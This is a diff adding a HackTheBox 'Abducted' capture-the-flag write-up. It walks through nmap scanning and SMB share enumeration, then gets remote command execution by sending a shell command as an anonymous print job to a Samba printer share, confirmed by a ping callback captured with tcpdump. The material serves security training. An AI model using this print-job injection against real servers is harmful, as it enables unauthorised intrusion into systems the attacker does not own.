@@ -1,29 +1,143 @@
 
+# #HTB 
+
+
+![[Pasted image 20260904040304.png|281]]
+
+
+# HackTheBox: Abducted
+
+**Machine IP:** `10.129.244.177`  
+**Difficulty:** Medium  
+**OS:** Linux
+
+---
+
+## Tools Used
+- `nmap` - Port discovery
+- `smbclient` / `smbmap` - SMB enumeration
+- `tcpdump` - Network sniffing
+- `rclone` - Remote file transfer/config extraction
+- `ssh` - Remote access
+- `systemctl` - Service exploitation
+
+---
+
+## Step 1: Reconnaissance - Port Scanning
+
+### Why We Start with Nmap
+
+The first step in any penetration test is reconnaissance. We need to understand what services are running on the target machine, what ports are open, and what versions of software are being used. This information helps us identify potential vulnerabilities.
+
+### Nmap Command Explained
+
+```bash
+nmap -n -Pn -sV -sC 10.129.244.177
+```
+
+**Flag Breakdown:**
+- `-n`: Skip DNS resolution (faster scanning)
+- `-Pn`: Treat host as online (skip ping check)
+- `-sV`: Version detection - identifies service versions
+- `-sC`: Run default scripts - basic vulnerability checks
+
 ![[Pasted image 20260901142955.png|700]]
 
+### Nmap Results Analysis
 
+**Open ports discovered:**
+- **Port 22 (SSH)** - OpenSSH 9.6p1 Ubuntu
+    - Secure Shell service for remote administration
+    - Version 9.6p1 is relatively recent, likely no critical public exploits
+- **Port 139/445 (SMB)** - Samba smbd 4
+    - File sharing service
+    - NetBIOS name: `ABDUCTED`
+
+**Key Discovery:** The target has SMB services running, which often leads to file shares or printer vulnerabilities.
+
+
+---
+
+## Step 2: SMB Enumeration
+
+### Listing SMB Shares
+
+```bash
+smbclient -L \\\\10.129.244.177\\ -N
+```
+**Why This Matters:** Anonymous access to SMB shares can reveal sensitive files or misconfigurations.
 
 ![[Pasted image 20260901143016.png]]
 
+**Discovered Shares:**
+- `HP-Reception` - Printer
+- `projects` - Hartley Group Project Files
+- `transfer` - Staff file transfer
+- `IPC$` - IPC Service
 
+### Using SMBMap
 
-![[Pasted image 20260901143029.png]]
-
-
+```bash
+smbmap -H 10.129.244.177
+```
 
 ![[Pasted image 20260901143047.png]]
 
+**Results:**
+- All shares show `NO ACCESS` for null session
+- However, the `HP-Reception` share is accessible in some way
 
+
+
+----
+
+
+## Step 3: SMB Printer Exploitation
+
+### Understanding the Attack
+
+The `HP-Reception` share is a printer. When a printer processes print jobs, it can execute commands. The vulnerability is in how Samba handles printer spooling - we can send a shell command as a print job, and it will be executed on the server.
+
+### Crafting the Payload
+
+We'll create a file containing a ping command to confirm RCE and identify our IP.
+
+```bash
+echo 'ping -c 1 10.10.14.163' > 'sh'
+```
 
 ![[Pasted image 20260901143119.png]]
 
 
+### Sending the Print Job
+
+```bash
+smbclient //10.129.244.177/HP-Reception -N -c 'print "sh"'
+```
 
 ![[Pasted image 20260901143131.png]]
 
+**What This Does:**
+1. Connects to the `HP-Reception` share anonymously
+2. Sends a print job containing our command
+3. The server executes the command
 
+
+### Capturing the Response with tcpdump
+
+```bash
+sudo tcpdump -ni tun0 icmp
+```
 
 ![[Pasted image 20260901143144.png]]
+
+**Result:** We receive ICMP packets, confirming command execution!
+
+
+
+---
+
+
 
 
 
